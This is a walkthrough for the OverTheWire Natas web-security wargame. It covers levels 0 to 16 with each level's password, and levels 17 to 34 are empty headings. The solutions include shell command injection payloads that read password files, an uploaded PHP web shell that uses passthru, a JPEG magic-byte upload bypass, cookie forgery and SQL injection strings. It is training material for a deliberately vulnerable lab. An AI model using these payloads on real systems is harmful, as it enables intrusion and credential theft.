## Natas
#### Level 0
As explained in the Natas description, each level has its own website accessible via `https://natasX.natas.labs.overthewire.org`, where `X` is the level number. For every level, you will need to input the username which is in the format `natasX` where again `X` is the level number, and the password. Each level has access to the password for the next level.

To login to the preliminary level:

> URL: http://natas0.natas.labs.overthewire.org
>
> Username: natas0
>
> Password: natas0

---

#### Level 1
You can always view the page source of a website by right clicking anywhere and navigating to the "View Page Source" or "Inspect" option (for Google Chrome, but this may be slightly different for other web browsers).

From the HTML, you can easily find the password for natas1 as a comment.

Comments in HTML are written like this: `<!--Here is some comment-->`

Password: 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq

---

#### Level 2
Removing the ability to right click does not mean you cannot access the page source. This can still be accessed by going to the three vertical dots at the top right in the Chrome browser, "More Tools", and then "Developer Tools".

Navigate to the "Elements" tab and you will be able to view the page source.

Password: TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI

---

#### Level 3
If you view the page source this time, you will no longer be able to find an easily accessible password in the form of a comment. The only thing you will find is an `<img>` tag with the source in `files/pixel.png`.

You can navigate to this directory by appending it to the end of the website URL like this:

`http://natas2.natas.labs.overthewire.org/files`

This brings you to a list of files, with the already seen `pixel.png` but curiously another file called `users.txt`.

Traveling to this link displays the contents of the text file, with the password for natas3 being in there.

Password: 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH

---

#### Level 4
There is a new comment this time in the page source, "No more information leaks!! Not even Google will find it this time...". This suggests there is something that can be hidden from Google, or all search engines for that matter.

All search engines typically use what's known as a [webcrawler](https://www.cloudflare.com/en-gb/learning/bots/what-is-a-web-crawler/) which is a bot that 'crawls' the entire internet, or in other words, scrapes as much data as possible on every website which can then be fed through a search algorithm to organize each one so that search engines can provide relevant website results to user queries.

However, web crawlers are not always allowed to traverse every page and link on a website. They must follow what's known as the robots.txt protocol.

Most websites have a file named `robots.txt` in the source files and this dictates what pages and links web crawlers can and cannot access. You can have a look at the file by appending `robots.txt` to the website URL.

`http://natas3.natas.labs.overthewire.org/robots.txt`

This takes you to the file, where it says that it does not allow the webpage `/s3cr3t/` to be accessed by crawlers. Navigate to this page:

`http://natas3.natas.labs.overthewire.org/s3cr3t/`

This will bring you to a list of files with another `users.txt` file. Entering this link gives you the password for the next level.

Password: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ

---

#### Level 5
After accessing the page you are greeted with a message, "Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/".

The message will be different depending on from where you accessed the site.

Websites know where you came from to reach the site (i.e. the address of the prior webpage). This is known as the [Referer](https://en.wikipedia.org/wiki/HTTP_referer). It is often used as a means to track users for statistical or promotional purposes.

There are numerous ways you can spoof the website into thinking you came from "http://natas5.natas.labs.overthewire.org/". You could write a Python script, or use software that can intercept requests before it loads. The latter will be used to get an idea of how Burp Suite works.

If you open up Burp Suite and go to the 'Proxy' tab, you will be able to turn on Intercept. This will make it so every request is intercepted and put on hold, allowing you to observe each request and make adjustments before forwarding it.

Once Intercept is turned on, open up the built-in browser and head to "http://natas4.natas.labs.overthewire.org/". You will find an HTTP request in the Intercept window. Click on it and add a line in the raw request field:

`Referer: http://natas5.natas.labs.overthewire.org/`

Forward the request and the message should change.

Password: 0n35PkggAPm2zbEpOU802c0x0Msn1ToK

---

#### Level 6
After entering the webpage, you are again greeted with a message but this time it says, "Access disallowed. You are not logged in".

Unlike the previous level, we are given less of a hint on what to do and where to look. However, the key message is that the website somehow knows that you are not logged in.

You may have noticed if you have been on the internet before, that you don't need to login repeatedly everytime you access a particular website if you have already logged in once. Websites use something called [cookies](https://en.wikipedia.org/wiki/HTTP_cookie#Session_management) to remember information about a user. Cookies are stored on the user's device while they are browsing, holding useful data such as a 'state' like items that have been added to a shopping cart, or to save previously entered input in text fields like addresses.

You can make use of Burp Suite again to intercept the request when accessing the natas5 webpage.

This time you will find a field called "Cookie" in the request with `loggedin=0`. Simply change this to a 1 before forwarding and you will be given the password for natas6.

Password: 0RoJwHdSKWFTYR5WuiAewauSuNaBXned

---

#### Level 7
This time you are greeted with a form that asks you to input a 'secret'. You can try inputting an arbitrary string such as '1234', but this gives a message that says, "Wrong secret" at the top.

The first most obvious step is to check the source code, which the site has already given a handy link to. 

Upon going through it, you will find that there is a piece of PHP code out in the open that includes the file path `includes/secret.inc` to access the variable `$_POST['secret']`.

```php
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
```

> Note that the tags you see `<?` and `?>` that encapsulates the PHP code are known as PHP tags (usually it starts with `<?php` but `<?` is short-form and is only available if it has been enabled in the `php.ini` file on the server).

Navigate to `http://natas6.natas.labs.overthewire.org/includes/secret.inc` to find the aforementioned secret.

Lastly, input the secret into the form and you will receive the passsword for natas7.

Password: bmg8SvU1LizuWjx3y7xkNERkHxGre0GS

---

#### Level 8
The website has a 'Home' and 'About' page links. Clicking on one of them navigates you to that page and displays a message such as "this is the about page".

If you view the source code you will find a hint:

`<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->`

Knowing this, you can capitalize on the non-existent security of this site and navigate to that page using the PHP link. Doing so will display the contents of natas8, which holds the password.

`https://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`

Password: xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q

---

#### Level 9
When you enter natas8, you will find the page very similar to [Level 7](#level-7). You have a form that requires you to input a secret, and presumably just like in Level 7, if you enter the correct string, you will receive the password for natas9.

Again, view the source code.

You will find another curious PHP code snippet:

```php
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
```

Reading through the code carefully, it should become apparent that firstly, the secret cannot be easily accessed, and secondly, it is being encoded and compared to the `$encodedSecret` string.

Focusing on the function `encodeSecret`, you can see that it takes the secret and encodes it in the following order:

1. Encodes the secret to base64 (`base64_encode()`)
2. Reverses the base64 string (`strrev()`)
3. Converts the reversed base64 string to hex(-adecimal) (`bin2hex()`)

Given this, we can go backwards starting from the `$encodedSecret` string to obtain the original string (secret).

1. Convert to binary text (ASCII)
2. Reverse the string
3. Decode from base64

For this, there is a very handy tool known as [CyberChef](https://gchq.github.io/CyberChef/). It is known as the swiss army knife of cybersecurity when it comes to encryption, encoding, compression, etc.

Paste the `$encodedSecret` into the input and CyberChef should autodetect that the format is in hex and convert it to binary text or ASCII. The next step is to search through the arsenal of tools to find 'Reverse' which simply reverses the string. Lastly, find the `From Base64` operation to decode from base64.

The operations should look like [this](https://gchq.github.io/CyberChef/#recipe=From_Hex('None')Reverse('Character')From_Base64('A-Za-z0-9%2B/%3D',true,false)&input=M2QzZDUxNjM0Mzc0NmQ0ZDZkNmMzMTU2Njk1NjMzNjI).

The final output is the secret.

Going back to the webpage and inputting it yields the password for natas9.

Password: ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t

---

#### Level 10
There is a message, "Find words containing:" and then a form for input. Inputting a word such as "secret" gives back a list of words that contain the string "secret".

View the source code.

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
```

This time you will find a different piece of PHP code. This first initializes a variable called `$key`, then checks if some variable called "needle" is in `$_REQUEST` via `array_key_exists()`. More information about global PHP variables can be found [here](https://www.w3schools.com/php/php_superglobals_request.asp). If it exists, it sets `$key` to the value of the variable "needle" in the request. Finally, if `$key` is not empty, it calls the `passthru` command. According to the PHP documentation on [passthru](https://www.php.net/manual/en/function.passthru.php), it can be found that this command executes system commands just like on the command line. You can see this is used to output matching words in `dictionary.txt` that contain `$key` through the use of `grep`.

With this in mind, you could exploit this vulnerability by using command injection.

Remember that you can run multiple commands in one line via a `;` between each one, so inputting something like `secret; ls /` would in fact cause `passthru` to execute the command `grep -i secret; ls / dictionary.txt`. This would show all the files in the root directory.

From the initial description of [natas](https://overthewire.org/wargames/natas/), it states that all passwords are stored in `/etc/natas_webpass/natasX` where X is the level number.

So, knowing this you can try inputting `; ls /etc/natas_webpass/natas10` (it is not necessary to have a string like 'secret' at the start). The output shows that the file path does exist, thus you can now try reading the file.

`; cat /etc/natas_webpass/natas10`

> Note that this will also read the `dictionary.txt` because remember that the full command `passthru` will execute is `grep -i; cat /etc/natas_webpass/natas10 dictionary.txt`.

Password: t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu

---

#### Level 11
Level 11 is an extension of the previous level. The only difference on the webpage is that it has a new message, "For security reasons, we now filter on certain characters".

Viewing the source code, you can find a new version compared to [Level 10](#level-10):

```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
```

There is now a form of input validation which checks if your input contains `;`, `|` or `&`. `preg_match()` is used to perform a regular expression match as stated in the PHP documentation for [preg_match](https://www.php.net/manual/en/function.preg-match.php). This would render the previous level's solution useless.

However, with a bit of creativity, there is another way.

`passthru` executes the command `grep` so developing a better understanding of the command and its options may be helpful in figuring out an alternative approach. The GeeksForGeeks site on [grep](https://www.geeksforgeeks.org/grep-command-in-unixlinux/) says that the general format of the command is `grep [options] pattern [files]`. You can specify multiple files for simultaeneous searching.

So instead what you can do is input `'' /etc/natas_webpass/natas11` which would mean the full command executed is `grep -i '' /etc/natas_webpass/natas11 dictionary.txt`. This follows the required format for `grep` whilst avoiding the use of illegal characters defined by the filter. The `''` would simply match everything and it will output the contents of the password file for natas11 and the `dictionary.txt`.

Password: UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk

---

#### Level 12
In Level 12, you are greeted with a similar looking website but only this time it is a form that allows you to set the background color of the website. You can try inputting a valid hex color code such as `#eb4034` which will set the background to a bright red backdrop. There is also a message at the top, "Cookies are protected with XOR encryption" which gives a hint as to how to obtain the password for the next level.

View the source code as usual (omitting the irrelevant code):

```php
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);
```

Going from the top, a variable `$defaultdata` is first initialized and set to an array with the properties of "showpassword" and "bgcolor".

Then three functions are defined:

- XOR encryption function (will be explained further down)
- `loadData($def)`
- `saveData($d)`

...
...
...

```php
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
```

This last snippet of PHP code indicates that in order to see the password for natas12, the value of "showpassword" in the `$data` array must be set to "yes". After understanding the code, it should be clear that the original cookie should be replaced with something else that would instead represent an array `array( "showpassword"=>"yes", "bgcolor"=>"#ffffff")`.

First, find the original cookie by going into Developer Tools (if you are on a Chrome browser) via the 3 dots and 'More Tools' or press `⌥ + ⌘ + I` on a Mac or `CTRL + SHIFT + I` on a Windows machine. Navigate to the Applications tab to find the "data" cookie.

`HmYkBwozJw4WNyAAFyB1VUcqOE1JZjUIBis7ABdmbU1GIjEJAyIxTRg%3d`

You might notice that it is not currently in Base64 format, and that is because the URL needs to be decoded to convert elements such as `%3d` to `=`.

Once the URL has been decoded, decode the Base64 string.

From here, you can apply XOR encryption with the key `{"showpassword":"no","bgcolor":"#ffffff"}`, setting the format as UTF8.

> To json encode `array( "showpassword"=>"no", "bgcolor"=>"#ffffff")`, you can use https://onlinephp.io/ with the code:
> ```php
> <?php
> 
> $defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
> 
> echo json_encode($defaultdata);
> 
> ?>
> ```

You can combine all of these steps together in [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Decode()From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'UTF8','string':'%7B%22showpassword%22:%22no%22,%22bgcolor%22:%22%23ffffff%22%7D'%7D,'Standard',false)&input=SG1Za0J3b3pKdzRXTnlBQUZ5QjFWVWNxT0UxSlpqVUlCaXM3QUJkbWJVMUdJakVKQXlJeFRSZyUzZA) to retrieve the output:

`eDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoeDWoe`

Note that the key is repeated because it is smaller than the plain text. You can infer therefore that the key is `eDWo`.

Use the newly found key, you can now correctly encode `{"showpassword":"yes","bgcolor":"#ffffff"}` through XOR encryption first, then converting it to Base64. It should look like [this](https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'UTF8','string':'eDWo'%7D,'Standard',false)To_Base64('A-Za-z0-9%2B/%3D')&input=eyJzaG93cGFzc3dvcmQiOiJ5ZXMiLCJiZ2NvbG9yIjoiI2ZmZmZmZiJ9) in CyberChef.

New Cookie: `HmYkBwozJw4WNyAAFyB1VUc9MhxHaHUNAic4Awo2dVVHZzEJAyIxCUc5`

After obtaining the new cookie, all you have to do is set the 'data' variable to that and refresh the window.

Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

---

#### Level 13
In Level 13, you are able to choose and upload a JPEG file. You can try uploading any kind of file within 1KB of size and if successful you will be greeted with a message in a format like: `The file upload/abc123.jpeg has been uploaded`.

<u>Source Code</u>

```php
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

Most of the PHP code is not relevant in solving this level however one key line is this:

`<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />`

You can see here that the filename is saved as a randomly generated string and then attaches the .jpg extension. This means that regardless of what file you upload, it will be set as .jpg. The file is then saved in a directory `upload/`.

Given this, you could create a PHP script (as the website is written in PHP) that prints the contents of the natas13 password file and upload it onto the website. Once it is uploaded, accessing the file should execute the code.

```php
<?php

passthru("cat /etc/natas_webpass/natas13");

?>
```

However as previously mentioned, uploading any file will result in it being changed to a .jpg format if it isn't already. Thus, you could use Burp Suite to intercept the request and change the extension to .php before it gets uploaded, or alternatively, use Developer Tools in a Chrome browser after choosing the file but before uploading, and modify the filename back to the .php extension.

Then, upload the file. The file should now be available in `upload/` with the original .php extension.

Finally, navigate to where the file is on the website: `http://natas12.natas.labs.overthewire.org/upload/abc123.php` where `abc123` should be replaced with the randomly generated string.

Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC

---

#### Level 14
This level is very similar to the previous level but with one minor difference. As mentioned at the top of the site, "For security reasons, we now only accept image files!".

Viewing the source code, there is one key difference compared to the previous level:

```php
if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
}
```

In this snippet, you can see that there is now an extra check to determine if the uploaded file is an image or not via the `exif_imagetype()`. A quick search shows that [exif_imagetype](https://www.php.net/manual/en/function.exif-imagetype.php) reads the first byes of an image and checks its signature.

It is possible to bypass this check by writing the first bytes of a script as the JPEG file signature and then appending the PHP code after. That way, it fools the function into returning the file type as JPEG.

The JPEG file signature is `FF D8 FF E0` from the [List of File Signatures Wiki](https://en.wikipedia.org/wiki/List_of_file_signatures) or in the full format, `0xFF 0xD8 0xFF 0xE0`.

```bash
$ echo -e "\xFF\xD8\xFF\xE0" > script.php
$ file script.php
script.php: JPEG image data
$ echo -n '<?php passthru("cat /etc/natas_webpass/natas14"); ?>' >> script.php
$ file script.php
script.php: JPEG image data
```

> Note that the flag `-e` enables the interpretion of backslash escapes as stated in the [echo](https://linux.die.net/man/1/echo) documentation. In this case, `\x` denotes the start of a hexadecimal character code. The `-n` is used to omit the trailing newline at the end which is important so that the file type remains to be seen as an image.

Next, repeat the same steps as in [Level 13](#level-13) by first choosing the script file, and then going into Developer Tools to change the extension to .php before uploading. Afterwards, navigate to the randomly generated filename in `uploads/`.

Password: z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

---

#### Level 15
In Level 15, we are presented with a username and password form reminiscent of older website login pages. Inputting an arbitary username and password will result in a "Access denied!" message.

As usual, view the source code:

```php
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
```

This time we are introduced to an SQL query for the first time. If you have never encountered SQL before, it is highly recommended to learn the basics before attempting further challenges.

The main line of interest is `$query`:

```php
"SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
```

Usually an SQL query is in the format like this:

```sql
SELECT * from users where username="John Doe" and password="123";
```

However, because this is embedded within PHP code, the whole query must be enclosed in double quotes to be interpreted as a string by PHP. Doing so would also mean that you have to escape the set of double quotes around the username and password (`\"` and `\"`) so as to include them as part of the string; not breaking PHP's string parsing and causing it to believe it is a string termination.

> The `.` used to contain `$_REQUEST["username"]` is needed to concatenate a PHP variable to a string. String concatenation in PHP is explained [here](https://stackoverflow.com/questions/8336858/how-can-i-combine-two-strings-together-in-php). Basically, if you have two variables, say, `$a` and `$b`, in order to concatenate the two as a string, you would use `$a . $b`. So the whole SQL query line can be broken down into sub-parts:
>
> - `"SELECT * from users where username=\""` <br>
> - `. $_REQUEST["username"] .` <br>
> - `"\" and password=\""` <br> 
> - `. $_REQUEST["password"] .` <br> 
> - `"\"";`

The fact that user input is directly placed into the SQL query leads to a very serious vulnerability. There is a way to exploit this by inserting unexpected input (SQL code) to login succesfully, or access the usernames and passwords in a database. This is known as [SQL Injection](https://www.w3schools.com/sql/sql_injection.asp).

Instead of inputting a typical username and password string that the developers might expect, you can try something like:

`Username: " or ""="`
`Password: " or ""="`

This still creates a well-formed SQL query:
```sql
SELECT * from users where username="" or ""="" and password="" or ""=""
```

The first quote closes the initial quote used to enclose the string, and the `""="` is used to complete the ending quote.

Because `""=""` is always true, it will print all user records.

Instead though, for this example, the PHP code will print the password for natas15 if the number of rows returned by the query is greater than 0.

Password: SdqIqBsFcz3yotlNYErZSZwblkm0lrvx

---

#### Level 16
In Level 16, we are greeted with a similar page but instead only has a form for username and a button that says, "Check existence". Inputting a random string such as "abc" and pressing the button takes us to a new page with a message that says, "This user doesn't exist".

```php
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

<form action="index.php" method="POST">
Username: <input name="username"><br>
<input type="submit" value="Check existence" />
</form>
<?php } ?>
```

Viewing the source code, you can see that there is no easy way to retrieve the password through SQL injection like in the previous level.

---

#### Level 17

---

#### Level 18

---

#### Level 19

---

#### Level 20

---

#### Level 21

---

#### Level 22

---

#### Level 23

---

#### Level 24

---

#### Level 25

---

#### Level 26

---

#### Level 27

---

#### Level 28

---

#### Level 29

---

#### Level 30

---

#### Level 31

---

#### Level 32

---

#### Level 33

---

#### Level 34

---

